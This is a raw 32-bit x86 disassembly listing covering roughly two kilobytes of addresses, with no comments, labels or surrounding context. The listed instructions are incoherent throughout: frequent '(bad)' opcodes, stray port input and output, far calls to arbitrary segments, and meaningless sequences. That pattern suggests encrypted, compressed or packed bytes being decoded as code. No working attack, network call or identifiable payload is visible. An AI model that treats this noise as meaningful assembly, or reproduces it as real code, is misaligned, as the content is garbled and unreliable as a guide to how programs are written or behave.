  41ca46:	ret    
  41ca47:	sub    BYTE PTR [eax-0x7a13de70],ah
  41ca4d:	popf   
  41ca4e:	ret    
  41ca4f:	nop
  41ca50:	int3   
  41ca51:	mov    bh,0x7
  41ca53:	xchg   DWORD PTR [esi+0x615d124b],eax
  41ca59:	sub    dh,bl
  41ca5b:	mov    DWORD PTR [edx],ebx
  41ca5d:	push   ds
  41ca5e:	test   ebp,0x431aaf45
  41ca64:	jne    0x41ca11
  41ca66:	aas    
  41ca67:	push   0xffffffd1
  41ca69:	das    
  41ca6a:	sbb    DWORD PTR [ebp-0x79a6c0],0x96e2150b
  41ca74:	(bad)  
  41ca75:	in     eax,dx
  41ca76:	out    0x22,al
  41ca78:	imul   eax,edi,0x590dc1fd
  41ca7e:	fsub   DWORD PTR [ecx+0x56]
  41ca81:	jle    0x41ca3f
  41ca83:	pop    ds
  41ca84:	enter  0x49b5,0x11
  41ca88:	sbb    esp,esp
  41ca8a:	inc    edx
  41ca8b:	push   ebp
  41ca8c:	cmc    
  41ca8d:	sbb    cl,BYTE PTR [ecx]
  41ca8f:	in     al,dx
  41ca90:	dec    esp
  41ca91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca92:	push   0xabbf00e3
  41ca97:	pusha  
  41ca98:	(bad)  
  41ca99:	dec    ebx
  41ca9a:	cli    
  41ca9b:	scas   eax,DWORD PTR es:[edi]
  41ca9c:	in     eax,dx
  41ca9d:	mov    dh,0x31
  41ca9f:	neg    DWORD PTR [edx]
  41caa1:	aaa    
  41caa2:	shl    DWORD PTR [esi],0x20
  41caa5:	fwait
  41caa6:	xor    eax,eax
  41caa8:	cmp    dh,BYTE PTR [edi]
  41caaa:	or     al,0xe8
  41caac:	outs   dx,BYTE PTR ds:[esi]
  41caad:	(bad)  
  41caae:	xor    al,0xa5
  41cab0:	inc    ebx
  41cab1:	push   cs
  41cab2:	call   FWORD PTR [edi-0x2daa9d46]
  41cab8:	lods   al,BYTE PTR ds:[esi]
  41cab9:	inc    ebp
  41caba:	add    al,0x6d
  41cabc:	xchg   ebx,eax
  41cabd:	ins    BYTE PTR es:[edi],dx
  41cabe:	push   esp
  41cabf:	cmp    ch,BYTE PTR [esi+0x50]
  41cac2:	pushf  
  41cac3:	aam    0x4d
  41cac5:	mov    esp,0x17f3b991
  41caca:	aad    0xa9
  41cacc:	cmp    cl,BYTE PTR [eax]
  41cace:	xor    al,0x33
  41cad0:	pop    eax
  41cad1:	shr    DWORD PTR [esi+0x7e],1
  41cad4:	jmp    0xcd5699db
  41cad9:	cmp    BYTE PTR [edi+0x18],bl
  41cadc:	push   ss
  41cadd:	ror    cl,1
  41cadf:	pop    es
  41cae0:	in     al,0x8
  41cae2:	mov    eax,ds:0x7ad0936b
  41cae7:	push   cs
  41cae8:	imul   BYTE PTR [edi]
  41caea:	dec    ecx
  41caeb:	mov    WORD PTR ds:0x9194606,ss
  41caf1:	addr16 inc ecx
  41caf3:	push   eax
  41caf4:	pop    ds
  41caf5:	in     al,dx
  41caf6:	and    edx,DWORD PTR [edx]
  41caf8:	enter  0x583e,0x22
  41cafc:	jl     0x41cac2
  41cafe:	ds data16 (bad) 
  41cb01:	dec    esp
  41cb02:	loope  0x41cb4c
  41cb04:	lea    ecx,[edx-0x31]
  41cb07:	jbe    0x41caf8
  41cb09:	leave  
  41cb0a:	in     al,dx
  41cb0b:	add    eax,0xd00d32bd
  41cb10:	in     al,dx
  41cb11:	jno    0x41cb13
  41cb13:	lea    esi,[edi+0x2f504ec]
  41cb19:	or     ch,ch
  41cb1b:	loope  0x41cb28
  41cb1d:	adc    al,0xd7
  41cb1f:	call   0x8865:0x7a2389e5
  41cb26:	ss jmp 0x41cb86
  41cb29:	add    al,0x28
  41cb2b:	stos   DWORD PTR es:[edi],eax
  41cb2c:	xchg   edi,eax
  41cb2d:	shr    DWORD PTR [ebp+0x10105b1f],0x54
  41cb34:	ret    0xbd6
  41cb37:	sub    BYTE PTR [edi-0x7f0354e9],ah
  41cb3d:	xor    eax,0x9bfea9b7
  41cb42:	gs push ecx
  41cb44:	and    eax,0x4ef82cf5
  41cb49:	inc    ebx
  41cb4a:	add    dl,BYTE PTR [ebp-0x29]
  41cb4d:	(bad)  
  41cb4e:	int    0x6d
  41cb50:	mov    dh,dl
  41cb52:	mov    ecx,0x9ae340ee
  41cb57:	push   edx
  41cb58:	fldenv [edi-0x48]
  41cb5b:	add    eax,eax
  41cb5d:	shr    DWORD PTR [ebx-0x5b334011],0x2
  41cb64:	jnp    0x41cb26
  41cb66:	js     0x41cb6f
  41cb68:	dec    edi
  41cb69:	mov    bl,0x9a
  41cb6b:	cmc    
  41cb6c:	popf   
  41cb6d:	dec    ebx
  41cb6e:	dec    ebp
  41cb6f:	push   ss
  41cb70:	inc    ebp
  41cb71:	loope  0x41cbbf
  41cb73:	adc    eax,0xb23bec02
  41cb78:	cld    
  41cb79:	cmp    DWORD PTR [ebx],edi
  41cb7b:	add    al,0x8e
  41cb7d:	jge    0x41cb8d
  41cb7f:	mov    DWORD PTR [edi+0x55],0x78f88f09
  41cb86:	pop    ebp
  41cb87:	mov    ds:0xf9f911db,eax
  41cb8c:	dec    eax
  41cb8d:	or     DWORD PTR [ecx+0x6de36629],eax
  41cb93:	rol    BYTE PTR [ecx+ecx*8-0x24],0x56
  41cb98:	add    BYTE PTR [esi],dh
  41cb9a:	jle    0x41cbb3
  41cb9c:	test   al,0x2d
  41cb9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb9f:	adc    edx,ecx
  41cba1:	aam    0xa3
  41cba3:	and    ah,BYTE PTR [eax-0x15]
  41cba6:	(bad)  
  41cba7:	fcmovbe st,st(6)
  41cba9:	mov    ebp,DWORD PTR [esi+ebp*2+0x1]
  41cbad:	lods   eax,DWORD PTR ds:[esi]
  41cbae:	test   DWORD PTR [ecx-0x71e439f9],esp
  41cbb4:	fcomi  st,st(2)
  41cbb6:	fimul  WORD PTR [ebx+0x6c]
  41cbb9:	in     eax,0xdd
  41cbbb:	push   0x38
  41cbbd:	(bad)  
  41cbbe:	cmp    al,0xc1
  41cbc0:	fidiv  DWORD PTR [ebp+0x18]
  41cbc3:	xchg   ebx,eax
  41cbc4:	outs   dx,BYTE PTR ds:[esi]
  41cbc5:	fcomip st,st(4)
  41cbc7:	xor    BYTE PTR [esi-0x1d27e0ec],ch
  41cbcd:	ins    BYTE PTR es:[edi],dx
  41cbce:	aaa    
  41cbcf:	jecxz  0x41cc3f
  41cbd1:	je     0x41cbe7
  41cbd3:	dec    ecx
  41cbd4:	test   al,0xe9
  41cbd6:	jge    0x41cb8d
  41cbd8:	aam    0x87
  41cbda:	sub    DWORD PTR [ecx+0x203dfb01],edx
  41cbe0:	inc    esp
  41cbe1:	js     0x41cc4c
  41cbe3:	sub    ebx,ecx
  41cbe5:	cdq    
  41cbe6:	aam    0x7b
  41cbe8:	aam    0x9e
  41cbea:	and    al,0xe3
  41cbec:	and    eax,0x3c41c7d7
  41cbf1:	repz fidivr DWORD PTR [edx]
  41cbf4:	mov    esi,0x834d5fb1
  41cbf9:	xor    ch,0xa1
  41cbfc:	push   0x76
  41cbfe:	jae    0x41cb9d
  41cc00:	addr16 mov cl,0x75
  41cc03:	pop    edx
  41cc04:	jo     0x41cbe2
  41cc06:	cmp    al,0xe4
  41cc08:	pop    ss
  41cc09:	lods   al,BYTE PTR ds:[esi]
  41cc0a:	aaa    
  41cc0b:	adc    DWORD PTR [ebp-0x5f492d9],esi
  41cc11:	sbb    eax,0x3fdfa2f7
  41cc16:	inc    edx
  41cc17:	sub    al,0x7a
  41cc19:	cmp    DWORD PTR [edi+esi*4-0x65],0x31cf7b94
  41cc21:	pop    es
  41cc22:	out    0xe3,eax
  41cc24:	push   ecx
  41cc25:	ins    BYTE PTR es:[edi],dx
  41cc26:	data16 je 0x41cc49
  41cc29:	mov    ah,0x49
  41cc2b:	popf   
  41cc2c:	fwait
  41cc2d:	jns    0x41cc19
  41cc2f:	js     0x41cc35
  41cc31:	(bad)  
  41cc32:	jge    0x41cc32
  41cc34:	adc    dl,ah
  41cc36:	and    eax,0xc5b0dabf
  41cc3b:	enter  0xb289,0xb4
  41cc3f:	lods   al,BYTE PTR ds:[esi]
  41cc40:	fdiv   st,st(0)
  41cc42:	xlat   BYTE PTR ds:[ebx]
  41cc43:	inc    edx
  41cc44:	sbb    BYTE PTR [ebp-0x45],bh
  41cc47:	je     0x41cbcc
  41cc49:	in     al,dx
  41cc4a:	inc    esp
  41cc4b:	popf   
  41cc4c:	adc    BYTE PTR [edi+0x2e],0x5e
  41cc50:	std    
  41cc51:	jo     0x41cbde
  41cc53:	mov    esi,0x52860d9e
  41cc58:	sbb    BYTE PTR [eax],bl
  41cc5a:	xchg   ebx,eax
  41cc5b:	ret    
  41cc5c:	dec    edi
  41cc5d:	sbb    DWORD PTR [ecx-0x54],0xbbf0a7d8
  41cc64:	and    al,BYTE PTR [ecx-0x2e227ee3]
  41cc6a:	mov    eax,0x9fe1e117
  41cc6f:	xchg   esp,eax
  41cc70:	mov    eax,ds:0x48350dac
  41cc75:	pusha  
  41cc76:	fistp  QWORD PTR [edx]
  41cc78:	push   ebp
  41cc79:	mov    eax,ds:0xa1a417b2
  41cc7e:	fsub   DWORD PTR [edi+0x37]
  41cc81:	cs jecxz 0x41cc8e
  41cc84:	ret    
  41cc85:	das    
  41cc86:	or     eax,0xca805a30
  41cc8b:	xchg   esp,eax
  41cc8c:	add    al,BYTE PTR [esi-0x64980db9]
  41cc92:	outs   dx,BYTE PTR ds:[esi]
  41cc93:	popa   
  41cc94:	inc    ebx
  41cc95:	pop    es
  41cc96:	xlat   BYTE PTR ds:[ebx]
  41cc97:	loop   0x41ccaa
  41cc99:	std    
  41cc9a:	out    dx,al
  41cc9b:	nop
  41cc9c:	add    eax,0xc0970d13
  41cca1:	inc    edx
  41cca2:	stc    
  41cca3:	daa    
  41cca4:	stc    
  41cca5:	and    eax,0xfb57cc61
  41ccaa:	adc    DWORD PTR [edx-0x6d11095c],esi
  41ccb0:	or     al,bl
  41ccb2:	loop   0x41cc7b
  41ccb4:	push   0x72be2267
  41ccb9:	and    BYTE PTR [edi],bl
  41ccbb:	sbb    BYTE PTR [eax-0x6c],al
  41ccbe:	loopne 0x41cced
  41ccc0:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ccc2:	mov    eax,0x65f590ca
  41ccc7:	xor    eax,0x8e4049f8
  41cccc:	jmp    0x704c:0x8fd90fde
  41ccd3:	cli    
  41ccd4:	dec    esp
  41ccd5:	out    dx,eax
  41ccd6:	ror    BYTE PTR [edi+0x2c],cl
  41ccd9:	fnstenv [ebp-0x60f8ce80]
  41ccdf:	jns    0x41cd49
  41cce1:	mov    BYTE PTR [eax],ah
  41cce3:	int    0x90
  41cce5:	in     al,0x17
  41cce7:	ret    
  41cce8:	mov    ebx,0xa4ac4563
  41cced:	retf   
  41ccee:	jmp    0x41cd57
  41ccf0:	lahf   
  41ccf1:	repnz mov al,ds:0xc4e99b4b
  41ccf7:	jnp    0x41ccc2
  41ccf9:	and    edx,DWORD PTR [edi+0x59d8f621]
  41ccff:	adc    DWORD PTR [esi],esp
  41cd01:	cmp    DWORD PTR [ecx-0x59],ebp
  41cd04:	mov    ds:0x8e939550,eax
  41cd09:	inc    edi
  41cd0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd0b:	inc    esi
  41cd0c:	xchg   esi,eax
  41cd0d:	push   edx
  41cd0e:	call   0x358a:0xd393ba92
  41cd15:	cmp    eax,0xba420fff
  41cd1a:	cmp    esp,DWORD PTR [ebx]
  41cd1c:	ins    BYTE PTR es:[edi],dx
  41cd1d:	clc    
  41cd1e:	inc    ecx
  41cd1f:	cmp    al,0xee
  41cd21:	out    dx,eax
  41cd22:	std    
  41cd23:	sbb    DWORD PTR [ebx-0x40],esp
  41cd26:	mov    cl,0xd4
  41cd28:	add    DWORD PTR [ecx-0x21],ebp
  41cd2b:	or     BYTE PTR [eax+0x50],bl
  41cd2e:	out    0x4,al
  41cd30:	adc    ebx,DWORD PTR [edx+0x2efe5b2d]
  41cd36:	aad    0x51
  41cd38:	adc    ebx,esp
  41cd3a:	inc    ecx
  41cd3b:	out    0x2d,al
  41cd3d:	mov    bl,0xc7
  41cd3f:	fcomp  QWORD PTR [esi+0x5de67713]
  41cd45:	(bad)  
  41cd46:	adc    al,0x6a
  41cd48:	test   BYTE PTR [eax-0x6a],0x31
  41cd4c:	sbb    ebp,0x261e0292
  41cd52:	sub    edx,ebx
  41cd54:	sub    BYTE PTR [esi],ch
  41cd56:	or     eax,0xbc728304
  41cd5b:	out    dx,al
  41cd5c:	add    al,cl
  41cd5e:	push   es
  41cd5f:	call   0xcddb15bb
  41cd64:	jne    0x41cd4c
  41cd66:	sbb    ebx,DWORD PTR [edx+0x21]
  41cd69:	cdq    
  41cd6a:	push   ecx
  41cd6b:	ror    DWORD PTR [ebx-0x2d],1
  41cd6e:	aam    0x55
  41cd70:	sbb    BYTE PTR [eax+ebp*1],dl
  41cd73:	aam    0xff
  41cd75:	inc    ebx
  41cd76:	lahf   
  41cd77:	push   0xffffffa9
  41cd79:	pop    ebp
  41cd7a:	xor    al,BYTE PTR [esi-0x56]
  41cd7d:	cli    
  41cd7e:	mov    ds:0x980cfa37,eax
  41cd83:	jg     0x41cd48
  41cd85:	push   es
  41cd86:	fnsave [ecx+0x2a]
  41cd89:	mov    edi,0xbb13bf42
  41cd8e:	adc    eax,0x22372e17
  41cd93:	jbe    0x41cd88
  41cd95:	std    
  41cd96:	fwait
  41cd97:	pop    eax
  41cd99:	add    al,0xd4
  41cd9b:	pop    esi
  41cd9c:	scas   eax,DWORD PTR es:[edi]
  41cd9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd9e:	loope  0x41cd39
  41cda0:	ins    BYTE PTR es:[edi],dx
  41cda1:	jl     0x41cdd7
  41cda3:	push   ds
  41cda4:	aaa    
  41cda5:	(bad)  
  41cda6:	loopne 0x41cdd3
  41cda8:	and    DWORD PTR [edx+0x0],ecx
  41cdab:	out    0x46,eax
  41cdad:	pop    es
  41cdae:	cdq    
  41cdaf:	xor    edi,DWORD PTR [eax+0x17]
  41cdb2:	xor    al,0xeb
  41cdb4:	and    eax,0x4504ebd5
  41cdb9:	push   es
  41cdba:	mov    dl,bh
  41cdbc:	ret    0xfe7a
  41cdbf:	xchg   edx,eax
  41cdc0:	cmp    dh,BYTE PTR [eax-0x67]
  41cdc3:	jns    0x41cd78
  41cdc5:	mov    esi,0xffa45b5c
  41cdca:	sub    DWORD PTR [ebx-0x4d],edx
  41cdcd:	mov    DWORD PTR [edx],ebx
  41cdcf:	mov    BYTE PTR [esi+0x652a9532],dh
  41cdd5:	jl     0x41ce04
  41cdd7:	mov    ch,0x26
  41cdd9:	rol    DWORD PTR [esi-0x24d56045],cl
  41cddf:	mov    eax,ds:0xcde2c607
  41cde4:	clc    
  41cde5:	fiadd  WORD PTR [eax+0x79]
  41cde8:	adc    eax,0x70eabcca
  41cded:	add    edx,DWORD PTR [edi-0x1165697d]
  41cdf3:	adc    bl,BYTE PTR [ecx]
  41cdf5:	sbb    eax,0x23f2b18e
  41cdfa:	inc    edx
  41cdfb:	xchg   esp,eax
  41cdfc:	fild   DWORD PTR [ebp+0x797446e2]
  41ce02:	pop    esi
  41ce03:	cmc    
  41ce04:	rcl    DWORD PTR [edx-0x3d473458],1
  41ce0a:	stc    
  41ce0b:	sbb    eax,0x2541d76
  41ce10:	pusha  
  41ce11:	dec    ebx
  41ce12:	ins    BYTE PTR es:[edi],dx
  41ce13:	sub    al,0x94
  41ce15:	int3   
  41ce16:	outs   dx,DWORD PTR ds:[esi]
  41ce17:	clc    
  41ce18:	sar    edi,0xb6
  41ce1b:	pop    ebp
  41ce1c:	xor    BYTE PTR [edx-0x2b024536],cl
  41ce22:	in     eax,0x6a
  41ce24:	push   edi
  41ce25:	addr16 and eax,0xd9a1d8d1
  41ce2b:	xor    al,BYTE PTR [eax+0x49]
  41ce2e:	sub    DWORD PTR [edx-0x10c3e5ce],edi
  41ce34:	imul   BYTE PTR [esi+0x43cb6663]
  41ce3a:	xchg   DWORD PTR es:[esi+ebp*1+0xaaea882],ebp
  41ce42:	push   ecx
  41ce43:	std    
  41ce44:	jnp    0x41ce1e
  41ce46:	xor    eax,0x74
  41ce49:	clc    
  41ce4a:	pop    ss
  41ce4b:	cmp    DWORD PTR [edi],esp
  41ce4d:	pop    ebp
  41ce4e:	pusha  
  41ce4f:	mov    ah,0x28
  41ce51:	cmp    al,0x1f
  41ce53:	xor    ebp,DWORD PTR [eax+0x2a]
  41ce56:	call   0x3723:0xea9621ab
  41ce5d:	mov    eax,ds:0x284c79d6
  41ce62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce63:	inc    ebp
  41ce64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce65:	stc    
  41ce66:	out    dx,al
  41ce67:	pop    edx
  41ce68:	inc    edx
  41ce69:	out    dx,eax
  41ce6a:	push   eax
  41ce6b:	div    eax
  41ce6d:	inc    edx
  41ce6e:	xor    ah,0x5c
  41ce71:	pop    eax
  41ce72:	mov    dl,0x2c
  41ce74:	hlt    
  41ce75:	and    BYTE PTR [eax+0x4fce9c23],bl
  41ce7b:	mov    edi,0xa7baa36c
  41ce80:	jne    0x41ce02
  41ce82:	out    0xd7,eax
  41ce84:	in     al,0x34
  41ce86:	jle    0x41ce87
  41ce88:	jg     0x41ce26
  41ce8a:	jl     0x41cec7
  41ce8c:	fisub  DWORD PTR [ebx+0x138cc956]
  41ce92:	imul   ebx,edi,0x81c9c4e0
  41ce98:	int3   
  41ce99:	mov    esp,0xacd14bdb
  41ce9e:	out    dx,eax
  41ce9f:	lods   al,BYTE PTR ds:[esi]
  41cea0:	add    ebp,edx
  41cea2:	cmp    ch,bl
  41cea4:	jb     0x41ce80
  41cea6:	fcomp  st(6)
  41cea8:	js     0x41cf01
  41ceaa:	jbe    0x41ce6f
  41ceac:	xchg   DWORD PTR [edi],edx
  41ceae:	or     ecx,eax
  41ceb0:	jae    0x41ce6c
  41ceb2:	mov    eax,0xd8c8be6a
  41ceb7:	and    ebp,DWORD PTR [ebx]
  41ceb9:	js     0x41ce7e
  41cebb:	jne    0x41ce85
  41cebd:	cmp    dh,BYTE PTR [edi]
  41cebf:	push   cs
  41cec0:	jle    0x41ce48
  41cec2:	ret    0xa9ea
  41cec5:	sbb    BYTE PTR [ebp+0x1d],ah
  41cec8:	retf   0x2a4b
  41cecb:	loopne 0x41cefc
  41cecd:	stc    
  41cece:	cmp    al,0x6f
  41ced0:	(bad)  
  41ced1:	fcomp  QWORD PTR [ebx+ecx*4]
  41ced4:	jne    0x41ceea
  41ced6:	pop    esp
  41ced7:	jmp    0x471b:0xb43051f8
  41cede:	jbe    0x41cecb
  41cee0:	rol    DWORD PTR [ebx],cl
  41cee2:	retf   
  41cee3:	into   
  41cee4:	adc    eax,0x8bef5c05
  41cee9:	mov    dl,0x59
  41ceeb:	jecxz  0x41ceec
  41ceed:	popa   
  41ceee:	fwait
  41ceef:	jbe    0x41ce88
  41cef1:	cmp    dh,BYTE PTR [ecx+0x16]
  41cef4:	nop
  41cef5:	sbb    al,BYTE PTR [esi+eax*8]
  41cef8:	lss    ebx,FWORD PTR [esi-0x16da64b6]
  41ceff:	repnz mov edi,0xb54e41de
  41cf05:	fprem  
  41cf07:	adc    bl,BYTE PTR [eax+0x687311ab]
  41cf0d:	and    eax,0x4dc1a807
  41cf12:	mov    ah,0x56
  41cf14:	mov    eax,ds:0xf3d5294b
  41cf19:	adc    BYTE PTR [edx],dl
  41cf1b:	data16 and al,BYTE PTR [esi-0x5d123cea]
  41cf22:	inc    edx
  41cf23:	inc    edi
  41cf24:	jno    0x41cef5
  41cf26:	pop    es
  41cf27:	arpl   bx,bp
  41cf29:	and    al,ah
  41cf2b:	jo     0x41cecc
  41cf2d:	push   ebx
  41cf2e:	push   ss
  41cf2f:	ins    DWORD PTR es:[edi],dx
  41cf30:	add    bl,dh
  41cf32:	imul   ebx,ebx,0xcb745554
  41cf38:	or     BYTE PTR [ebx],0x52
  41cf3b:	xchg   edi,eax
  41cf3c:	inc    eax
  41cf3d:	mov    ds:0xb640d423,al
  41cf42:	mov    ebp,0xafa61941
  41cf47:	in     eax,dx
  41cf48:	jp     0x41cf2d
  41cf4a:	mov    esi,0xfd40c517
  41cf4f:	sbb    eax,0x4746baf4
  41cf54:	or     al,0x7
  41cf56:	dec    ebx
  41cf57:	mov    ah,ch
  41cf59:	shr    DWORD PTR ds:0x61934a28,0x41
  41cf60:	call   0xf968fc1b
  41cf65:	outs   dx,BYTE PTR ds:[esi]
  41cf66:	popf   
  41cf67:	adc    DWORD PTR [ebx-0x2996396e],0x39512959
  41cf71:	clc    
  41cf72:	mov    esi,0xe446759
  41cf77:	mov    ecx,0x94f0ca81
  41cf7c:	data16 (bad) 
  41cf7e:	lock cmc 
  41cf80:	lock retf 
  41cf82:	push   0x8856e2e2
  41cf87:	xor    eax,0x8d8fb335
  41cf8c:	fnstcw WORD PTR [edi-0x41]
  41cf8f:	test   BYTE PTR [edx-0x5a73e3db],dl
  41cf95:	lods   al,BYTE PTR ds:[esi]
  41cf96:	cmp    cl,BYTE PTR [ebp-0x25]
  41cf99:	aas    
  41cf9a:	dec    ebx
  41cf9b:	xchg   edx,eax
  41cf9c:	jg     0x41cf91
  41cf9e:	stos   DWORD PTR es:[edi],eax
  41cf9f:	cli    
  41cfa0:	inc    esi
  41cfa1:	addr16 mov ah,0x1f
  41cfa4:	jecxz  0x41cf86
  41cfa6:	or     eax,0xcfcc5f2d
  41cfab:	inc    ecx
  41cfac:	loop   0x41cfef
  41cfae:	pop    ebp
  41cfaf:	mov    bh,0x82
  41cfb1:	mov    edi,0x1c053ce7
  41cfb6:	cwde   
  41cfb7:	push   eax
  41cfb8:	cs retf 0xd245
  41cfbc:	adc    edi,esp
  41cfbe:	fldcw  WORD PTR [ebx]
  41cfc0:	cld    
  41cfc1:	ror    DWORD PTR [ebx],1
  41cfc3:	cmc    
  41cfc4:	imul   ecx,DWORD PTR [edx-0x4e],0xffffff8d
  41cfc8:	mov    bh,0xd0
  41cfca:	mov    ebp,0xb7bec601
  41cfcf:	out    0xc9,al
  41cfd1:	sahf   
  41cfd2:	retf   
  41cfd3:	add    BYTE PTR [eax+0x2b4b2c45],bh
  41cfd9:	ss mov esp,0x36c327d
  41cfdf:	dec    eax
  41cfe0:	das    
  41cfe1:	push   eax
  41cfe2:	(bad)  
  41cfe3:	and    edi,edx
  41cfe5:	and    ebp,DWORD PTR [ebx]
  41cfe7:	ins    DWORD PTR es:[edi],dx
  41cfe8:	mov    eax,ds:0xddf6ae85
  41cfed:	outs   dx,DWORD PTR ds:[esi]
  41cfee:	sti    
  41cfef:	cli    
  41cff0:	popf   
  41cff1:	push   esp
  41cff2:	mov    bl,BYTE PTR [ecx]
  41cff4:	pushf  
  41cff5:	mov    ebx,0x84b02d1c
  41cffa:	add    edx,DWORD PTR [eax-0x4f7e7c71]
  41d000:	add    eax,0xabaacc56
  41d005:	xchg   ebp,eax
  41d006:	and    bl,bh
  41d008:	imul   ebx,DWORD PTR [ebx-0x5a],0xffffff82
  41d00c:	mov    cl,0xe6
  41d00e:	hlt    
  41d00f:	leave  
  41d010:	xchg   ebp,eax
  41d011:	pshufw mm3,mm1,0xe8
  41d015:	xchg   ebx,eax
  41d016:	dec    ecx
  41d017:	adc    ebx,edx
  41d019:	cmp    BYTE PTR [eax],0x27
  41d01c:	ret    0x7284
  41d01f:	push   ebp
  41d020:	(bad)  
  41d021:	sahf   
  41d022:	adc    BYTE PTR [ebp-0x7d],al
  41d025:	jp     0x41cfb1
  41d027:	rcr    DWORD PTR [edx+0x460818cd],cl
  41d02d:	push   esp
  41d02e:	add    al,0x24
  41d030:	rol    BYTE PTR [edx],0xaf
  41d033:	sub    DWORD PTR [edx+0x524a4e21],ebp
  41d039:	stos   BYTE PTR es:[edi],al
  41d03a:	sti    
  41d03b:	add    cl,BYTE PTR [edi+edx*4-0xc]
  41d03f:	push   ebx
  41d040:	mov    es,WORD PTR [eax-0x6cda574]
  41d046:	daa    
  41d047:	(bad)  
  41d048:	jns    0x41d0a1
  41d04a:	pushf  
  41d04b:	clc    
  41d04c:	loopne 0x41cfdf
  41d04e:	pop    edi
  41d04f:	ja     0x41d07c
  41d051:	pop    ebx
  41d052:	inc    ecx
  41d053:	inc    ebx
  41d054:	add    ch,BYTE PTR [edx-0x21cc39a1]
  41d05a:	retf   0x7176
  41d05d:	cld    
  41d05e:	adc    eax,0x42963ba5
  41d063:	xor    ch,BYTE PTR [esi+esi*2]
  41d066:	in     eax,dx
  41d067:	stc    
  41d068:	pop    es
  41d069:	jae    0x41cffd
  41d06b:	mov    ?,ecx
  41d06d:	(bad)  
  41d06e:	clc    
  41d06f:	lods   eax,DWORD PTR ds:[esi]
  41d070:	out    0x3d,eax
  41d072:	ja     0x41d08e
  41d074:	out    dx,al
  41d075:	adc    dh,BYTE PTR [edi]
  41d077:	jecxz  0x41d025
  41d079:	mov    ecx,0x9fa196f1
  41d07e:	cli    
  41d07f:	and    al,0x2c
  41d081:	imul   esi,ebp,0x31f3f62b
  41d087:	mov    bh,0x37
  41d089:	(bad)  
  41d08a:	xlat   BYTE PTR ds:[ebx]
  41d08b:	or     al,bl
  41d08d:	(bad)  
  41d08e:	mov    WORD PTR [ebp-0x76fd81ce],ds
  41d094:	push   ds
  41d095:	fwait
  41d096:	mov    al,0x88
  41d098:	cmp    al,0xdc
  41d09a:	es mov ebp,0xb297a40f
  41d0a0:	ja     0x41d0a1
  41d0a2:	xor    eax,0x248e55b1
  41d0a7:	data16 clc 
  41d0a9:	imul   edx,DWORD PTR [edi],0x7b
  41d0ac:	jb     0x41d02e
  41d0ae:	(bad)  
  41d0b0:	mov    cl,0x63
  41d0b2:	push   esi
  41d0b3:	ins    DWORD PTR es:[edi],dx
  41d0b4:	cwde   
  41d0b5:	mov    ebx,0x3569adeb
  41d0ba:	mov    DWORD PTR [eax+0xcca04f9],eax
  41d0c0:	call   0x2ed8:0x9af0b8fc
  41d0c7:	inc    esp
  41d0c8:	add    eax,0x6a783191
  41d0cd:	xchg   esp,eax
  41d0ce:	sub    al,0xf7
  41d0d0:	in     al,0x8e
  41d0d2:	jl     0x41d07e
  41d0d4:	or     DWORD PTR [edi-0x65],ecx
  41d0d7:	enter  0x5ed7,0x82
  41d0db:	vmread DWORD PTR [ecx+0x45],edi
  41d0df:	fstp   st(2)
  41d0e1:	int3   
  41d0e2:	retf   
  41d0e3:	ja     0x41d095
  41d0e5:	pop    ss
  41d0e6:	or     al,0x8b
  41d0e8:	dec    ebp
  41d0e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0ea:	cmp    cl,BYTE PTR [ebx]
  41d0ec:	out    0x6,al
  41d0ee:	and    eax,0xb15fa316
  41d0f3:	or     cl,BYTE PTR [ebp+ecx*2+0x2e02d6d5]
  41d0fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d0fb:	out    0xeb,eax
  41d0fd:	popf   
  41d0fe:	data16 std 
  41d100:	(bad)  [edx+0x3d99a821]
  41d106:	fldenv [esi-0x77240139]
  41d10c:	popf   
  41d10d:	aam    0x65
  41d10f:	std    
  41d110:	das    
  41d111:	ins    DWORD PTR es:[edi],dx
  41d112:	xchg   esi,eax
  41d113:	pushf  
  41d114:	mov    DWORD PTR [ecx],esi
  41d116:	bound  esi,QWORD PTR [ebx]
  41d118:	jbe    0x41d15f
  41d11a:	stos   BYTE PTR es:[edi],al
  41d11b:	pop    ss
  41d11c:	stc    
  41d11d:	jecxz  0x41d104
  41d11f:	xchg   DWORD PTR [ecx+0xd],eax
  41d122:	call   0xcf0c:0xd5a4a008
  41d129:	mov    ah,0x56
  41d12c:	xchg   ecx,eax
  41d12d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d12e:	mov    cl,0xa1
  41d130:	add    BYTE PTR [edx+0x72],ah
  41d133:	nop
  41d134:	lock test edx,ebp
  41d137:	xor    ah,ah
  41d139:	pusha  
  41d13a:	cmp    BYTE PTR [ebx+0x47658c85],dl
  41d140:	cmp    BYTE PTR [edi+0x49300661],cl
  41d146:	add    esi,DWORD PTR [ebp-0x45d3f089]
  41d14c:	stos   BYTE PTR es:[edi],al
  41d14d:	lahf   
  41d14e:	adc    al,0x29
  41d150:	popa   
  41d151:	xchg   esp,eax
  41d152:	push   edx
  41d153:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d154:	mov    eax,ds:0x7a3baa16
  41d159:	lea    ebx,[ecx+0x1de3583]
  41d15f:	in     eax,dx
  41d160:	dec    edx
  41d161:	in     eax,dx
  41d162:	mov    ch,0x51
  41d164:	test   eax,0x919e0afe
  41d169:	mov    bl,BYTE PTR [edx+esi*4]
  41d16c:	test   eax,0xce662fc4
  41d171:	pop    es
  41d172:	mov    bl,0x37
  41d174:	cmp    BYTE PTR [esp+eax*1],bh
  41d177:	fs in  eax,0xa1
  41d17a:	std    
  41d17b:	inc    ebx
  41d17c:	sbb    cl,bh
  41d17e:	test   BYTE PTR [edi],bl
  41d180:	add    ah,BYTE PTR [edx+0x75716ac0]
  41d186:	test   BYTE PTR es:[ebp+0x4],al
  41d18a:	lods   al,BYTE PTR ds:[esi]
  41d18b:	sti    
  41d18c:	push   cs
  41d18d:	inc    eax
  41d18e:	jge    0x41d1e6
  41d190:	mov    ds:0xc23db10b,al
  41d195:	pop    edi
